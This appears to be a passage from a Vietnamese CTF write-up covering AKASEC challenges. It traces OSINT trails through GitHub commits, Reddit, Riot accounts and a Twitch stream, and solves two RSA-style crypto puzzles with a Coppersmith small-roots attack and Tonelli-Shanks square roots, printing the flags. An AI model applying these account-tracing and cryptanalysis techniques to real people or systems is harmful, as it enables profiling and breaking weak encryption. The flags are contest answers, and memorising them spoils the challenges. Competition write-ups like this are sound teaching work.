Vậy là, có thể đáp án sẽ nằm ở trong bài này. Mình bắt đầu với các repos để xem có gì để tìm hiểu không, lúc này mình phát hiện ra các commit ở đây có vẻ khá là sus và ở repo minishell, khi vào phần commit, mình thấy nó đã rất rõ ràng

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/fc285580-7ccb-411e-9a8f-19e1dcd65bc0)

Vậy nên mình đi đến trang cuối và ghép các mảnh flag lại với nhau:

**Flag: AKASEC{H1dd3n_fl4g_1n_C0mM!t5_1snT_Th4t_HARD_hh}**

## Th3Hun7 3

Sau khi đã làm ra bài 2, thì mình phát hiện rằng ở github của người dùng này có tham gia tổ chức tên là L33t-C0ders

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/19d2f2ed-d162-42fa-a8b6-f55abc93d4e9)

Ở đây mình đã thử tìm tên của từng người, và sau khi tìm tên của fib0na7ch1, mình thấy người này có reddit và 1 comment

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/7b6fa7c8-7944-4bc3-a55c-e505a78ed723)

Ở đây, user này có comment là discord nitro và gắn kèm link, nhìn rất sus

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/327dc4c5-93d2-4d43-91c5-f18f6921c88c)

Sau đó mình bấm vào thì thấy rằng có 1 bức ảnh hiện ra

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/31ba4016-fc76-41f4-8b9b-59007ea63898)

Ở đây mình có 1 tài khoản liên minh, 1 tài khoản riot và 1 tài khoản reddit

Sau khi tìm thử tài khoản lol trên op.gg, mình nhận thấy rằng không có điểm gì đáng tìm cả.

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/40e2a6e5-43cc-414f-b90b-fc7cc489d73e)

Tiếp đó mình sang tài khoản Valorant vì riot ID ở đây bao gồm một số tựa game như vậy và chỉ có 2 game mới có thể track được kiểu này. Mình thấy được rằng tài khoản này gần đây có chơi game. Nhưng cũng không có gì đặc biệt cả. Thế nên mình xem thử người chơi cùng cậu ta là K4l0ri3z#1337

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/ee3baea3-c1c6-4210-baad-8377864ae8a3)

Lúc này mình thấy người chơi này có 1 tài khoản twitch

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/6399e4b4-296f-46f6-ba4f-eae6742ca8b6)

Mình bấm vào và phát hiện có 1 game đã stream. Lúc này thì mình ngồi xem từng đoạn một để xem có gì không ?

Sau khi xem thì mình phát hiện ra flag được bắn lên tường và ở trên chat

**Flag: AKASEC{5tR3Am_wA5_FuUuuUn}**


# Cryptography

## Source

```
from random import getrandbits
from Crypto.Util.number import getPrime, bytes_to_long
from SECRET import FLAG

e = 2
p = getPrime(256)
q = getPrime(256)
n = p * q

m = bytes_to_long(FLAG)
cor_m = m - getrandbits(160)

if __name__ == "__main__":
    c = pow(m, e, n)
    print("n = {}\nc = {}\ncor_m = {}".format(n, c, cor_m))
```

## Ciphertext

```
n = 5113166966960118603250666870544315753374750136060769465485822149528706374700934720443689630473991177661169179462100732951725871457633686010946951736764639
c = 329402637167950119278220170950190680807120980712143610290182242567212843996710001488280098771626903975534140478814872389359418514658167263670496584963653
cor_m = 724154397787031699242933363312913323086319394176220093419616667612889538090840511507392245976984201647543870740055095781645802588721
```

## Phân tích

Đây là dạng bài partly known message của Coppersmith attack, mình sẽ sử dụng phương pháp tương tự bài viết [này](https://hackmd.io/@nomorecaffeine/By_SVppIh)

## Lời giải

```
sage: n = 51131669669601186032506668705443157533747501360607694654858221495287063747009347204436896304739911776611691794
....: 62100732951725871457633686010946951736764639
sage: c = 32940263716795011927822017095019068080712098071214361029018224256721284399671000148828009877162690397553414047
....: 8814872389359418514658167263670496584963653
sage: cor_m = 7241543977870316992429333633129133230863193941762200934196166676128895380908405115073922459769842016475438
....: 70740055095781645802588721
sage: P.<x> = PolynomialRing(Zmod(n))
sage: f = (cor_m + x)^2 - c
sage: f = f.monic()
sage: f.small_roots()
[731552839472047918013656821739561688326920972620]
```
Từ đó ta thu được m, viết chương trình decode:

```
from Crypto.Util.number import *

m = 724154397787031699242933363312913323086319394176220093419616667612889538090840511508123798816456249565557527561794657469972723561341

print(long_to_bytes(m))
```
## Flag
`AKASEC{c0pp3r5m17h_4774ck_1n_1ov3_w17h_5m4ll_3xp0n3nts}`

# Power Over All

## Ciphertext
```
ps = [58320376514263631335873677765253125888698486914776244278840394907785982174227, 58471100903556849464997941473361218814224259836954194397969653104598610032001, 58604272362819290182402155417145974680722885151257754555756391392263925028373, 59492683945798085501800206338526899942899780311409115479365237372756535853291, 62289703300031234585435188246756616897767167359387015636210423567810538226487, 62357776874227535169229603723986677552237575016029450363623522209118965731477, 62742816090727067053274726868556821524033631101402012261515152539681610794161, 63324484395885397762900693586081837883926106660748610230948918800296364184787, 68536318595052838310834810610435117143127088803068602445335475326427140828313, 71333662629967127822322169475282958517332768085026414016527475771426692311137, 71818789628596987832122424763592924131858666988566206124807910367000034628553, 72686903390659724206544737536831534683324964478965218565533472954938736006029, 73733187867854099083339033682720615801689502367745526033697746193463091215391, 74963435458999407861524268290816092282448161750409920047891056819453141955557, 75170120333127044486222669300167892338904422362667312672451826995740967131303, 75389546402724552962462061186170732933053151602764277596760332277139980288183, 76425604829327821607866318415668087016313389323090875428602763671306466213509, 79395489525333852455993920714320320052245084253382013156160044439065839468327, 79656464249999345933529538948250990091001499735972420522175125449790253663599, 80114644787477907454032975169773036722948929091396695518111556258640245353257, 80759006745106776887940527633196344281100618167707846074299752297932178679679, 82874221581479658193940394796733443765246468888210669340444752189895488345711, 84468817045619298841099296118053247701538652785316191917289525698631379587559, 85092225008500173289712181614303627906592443829912221851650912999596788670459, 85263141959763159396039844302970550543465193325499728803392808980592668472247, 85317220893586781914729151221061742320435924332561513947650447739620101821641, 85440269113801669657707134806659364077593365787015642755204798072592063745773, 85527879261087022928016922730880335213911499029647505445360684307006839178647, 85605932852710450456174796386471227136632343649286364769039469217779231567929, 86107819754589869545139506654865763056227887269808133233781131410193748463851, 86163843486640208219217644606617383296879865315755352427047957187159788303323, 90506049416840638351240993555664643907544570698557428055802715993870286417397, 90981593208992230235747480738729958015954461329514397574562251177250355618859, 94292491231252601103954494535972386523808989201770556967497120902651386194197, 94647786177270050686880223709072304737527824812798720504615370320158513996239, 95245024143291248356010627064844329722889005501412707859257139919568967846749, 96080930363425942206733690433078387012542225534990227081492087888246704507441, 97503025379673346416669602471064834261095444529417927406127397664552811080519, 97933089652660434994459543027801105444314465759238615625507952727940600189809, 97989967696425430412414365007330195727579540568089381507635553281304266294483, 98528881400840757343372680020873216862352604380253902505512625033610753437887, 99954243543097817759175467071884308315066389399425962144138323810271659014209, 101194437697606745792831239895049471075868629243259633705095039109106669730049, 104839585136982979038455371159792466832240349600316352323298553695087849421381, 105456177698115744366058226841117004148984862640508652026693415913601327156663, 105968680258458596148231537242426487615777154901757802179920828015643162453013, 107215231310505428676141499322854084705449980120508349014281658724461432400217, 108453510226000323101878638579711809016925129461454736081626840494612032349563, 108912309872075893365304953396355888979232521108447384367848671194555817947569, 108997022694208058790012872910875462503431062529475661062287324154956518493253, 109322568022936420513907683387388159609608845110397725890561824119551381299491, 110029910646386857435917200277309270534213159892118369614262345955187628998231, 113144116692201726589659464242284454643667198002480615110504233499994524508369, 114364819674774846158222033218389865879337160752260853195966728903452922982539, 115473149458023487534963694928189868221104180303262395583076896364124371580681]
c = 53630975642867707857977893429296334474716191527562307357222551886495223105860
```

## Source

```
from Crypto.Util.number import getPrime, bytes_to_long
from random import randint
from SECRET import FLAG

def key_gen():
    ps = []
    n = randint(2,2**6)
    for _ in range(n):
        p = getPrime(256)
        ps.append(p)
    return ps

def encrypt(m, ps):
    ps.sort()
    for p in ps:
        e = 1<<1
        m = pow(m, e, p)
    return m

if __name__ == "__main__":
    ps = key_gen()
    c = encrypt(bytes_to_long(FLAG), ps)
    print('ps = {}\nc = {}'.format(ps, c))
```

## Phân tích
Sử dụng thuật toán Tonelli-Shanks, ta có thể dễ dàng giải bài này.

## Lời giải
```
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
from random import randint

def key_gen():
    ps = []
    n = randint(2, 2**6)
    for _ in range(n):
        p = getPrime(256)
        ps.append(p)
    return ps

def encrypt(m, ps):
    ps.sort()
    for p in ps:
        e = 1 << 1
        m = pow(m, e, p)
    return m

def modular_sqrt(a, p):
    """ Find a quadratic residue (mod p) of 'a'.
        Solve the congruence of the form: x^2 ≡ a (mod p)
        And returns both roots. Note that p - x is also a root.
        If no square root exists for these a and p, returns None.
    """
    # Check for simple cases
    if a == 0:
        return 0, 0
    if p == 2:
        return a, p - a

    # Check solution existence on odd prime
    leg = pow(a, (p - 1) // 2, p)
    if leg != 1:
        return None, None

    # Implementation of Tonelli-Shanks algorithm
    if p % 4 == 3:
        x = pow(a, (p + 1) // 4, p)
        return x, p - x

    # Partition p-1 to s * 2^e
    s, e = p - 1, 0
    while s % 2 == 0:
        s //= 2
        e += 1

    # Find some 'n' with a legendre symbol n|p = -1.
    n = 2
    while pow(n, (p - 1) // 2, p) != p - 1:
        n += 1

    # Initialization
    x = pow(a, (s + 1) // 2, p)
    b = pow(a, s, p)
    g = pow(n, s, p)
    r = e

    while True:
        t = b
        m = 0
        for m in range(r):
            if t == 1:
                break
            t = pow(t, 2, p)

        if m == 0:
            return x, p - x

        gs = pow(g, 2**(r - m - 1), p)
        g = (gs * gs) % p
        x = (x * gs) % p
        b = (b * g) % p
        r = m

def decrypt(c, ps):
    ps.sort(reverse=True)
    candidates = [c]

    for p in ps:
        new_candidates = []
        for candidate in candidates:
            sqrt1, sqrt2 = modular_sqrt(candidate, p)
            if sqrt1 is not None:
                new_candidates.append(sqrt1)
                new_candidates.append(sqrt2)
        candidates = new_candidates

    return candidates

if __name__ == "__main__":
    ps = [58320376514263631335873677765253125888698486914776244278840394907785982174227, 58471100903556849464997941473361218814224259836954194397969653104598610032001, 58604272362819290182402155417145974680722885151257754555756391392263925028373, 59492683945798085501800206338526899942899780311409115479365237372756535853291, 62289703300031234585435188246756616897767167359387015636210423567810538226487, 62357776874227535169229603723986677552237575016029450363623522209118965731477, 62742816090727067053274726868556821524033631101402012261515152539681610794161, 63324484395885397762900693586081837883926106660748610230948918800296364184787, 68536318595052838310834810610435117143127088803068602445335475326427140828313, 71333662629967127822322169475282958517332768085026414016527475771426692311137, 71818789628596987832122424763592924131858666988566206124807910367000034628553, 72686903390659724206544737536831534683324964478965218565533472954938736006029, 73733187867854099083339033682720615801689502367745526033697746193463091215391, 74963435458999407861524268290816092282448161750409920047891056819453141955557, 75170120333127044486222669300167892338904422362667312672451826995740967131303, 75389546402724552962462061186170732933053151602764277596760332277139980288183, 76425604829327821607866318415668087016313389323090875428602763671306466213509, 79395489525333852455993920714320320052245084253382013156160044439065839468327, 79656464249999345933529538948250990091001499735972420522175125449790253663599, 80114644787477907454032975169773036722948929091396695518111556258640245353257, 80759006745106776887940527633196344281100618167707846074299752297932178679679, 82874221581479658193940394796733443765246468888210669340444752189895488345711, 84468817045619298841099296118053247701538652785316191917289525698631379587559, 85092225008500173289712181614303627906592443829912221851650912999596788670459, 85263141959763159396039844302970550543465193325499728803392808980592668472247, 85317220893586781914729151221061742320435924332561513947650447739620101821641, 85440269113801669657707134806659364077593365787015642755204798072592063745773, 85527879261087022928016922730880335213911499029647505445360684307006839178647, 85605932852710450456174796386471227136632343649286364769039469217779231567929, 86107819754589869545139506654865763056227887269808133233781131410193748463851, 86163843486640208219217644606617383296879865315755352427047957187159788303323, 90506049416840638351240993555664643907544570698557428055802715993870286417397, 90981593208992230235747480738729958015954461329514397574562251177250355618859, 94292491231252601103954494535972386523808989201770556967497120902651386194197, 94647786177270050686880223709072304737527824812798720504615370320158513996239, 95245024143291248356010627064844329722889005501412707859257139919568967846749, 96080930363425942206733690433078387012542225534990227081492087888246704507441, 97503025379673346416669602471064834261095444529417927406127397664552811080519, 97933089652660434994459543027801105444314465759238615625507952727940600189809, 97989967696425430412414365007330195727579540568089381507635553281304266294483, 98528881400840757343372680020873216862352604380253902505512625033610753437887, 99954243543097817759175467071884308315066389399425962144138323810271659014209, 101194437697606745792831239895049471075868629243259633705095039109106669730049, 104839585136982979038455371159792466832240349600316352323298553695087849421381, 105456177698115744366058226841117004148984862640508652026693415913601327156663, 105968680258458596148231537242426487615777154901757802179920828015643162453013, 107215231310505428676141499322854084705449980120508349014281658724461432400217, 108453510226000323101878638579711809016925129461454736081626840494612032349563, 108912309872075893365304953396355888979232521108447384367848671194555817947569, 108997022694208058790012872910875462503431062529475661062287324154956518493253, 109322568022936420513907683387388159609608845110397725890561824119551381299491, 110029910646386857435917200277309270534213159892118369614262345955187628998231, 113144116692201726589659464242284454643667198002480615110504233499994524508369, 114364819674774846158222033218389865879337160752260853195966728903452922982539, 115473149458023487534963694928189868221104180303262395583076896364124371580681]
    c = 53630975642867707857977893429296334474716191527562307357222551886495223105860

    # Decrypting the message
    recovered_candidates = decrypt(c, ps)

    for recovered_m in recovered_candidates:
        try:
            recovered_flag = long_to_bytes(recovered_m)
            print("Recovered FLAG: ", recovered_flag)
        except:
            continue
```

## Flag
`AKASEC{akasec+palestine=<3}`

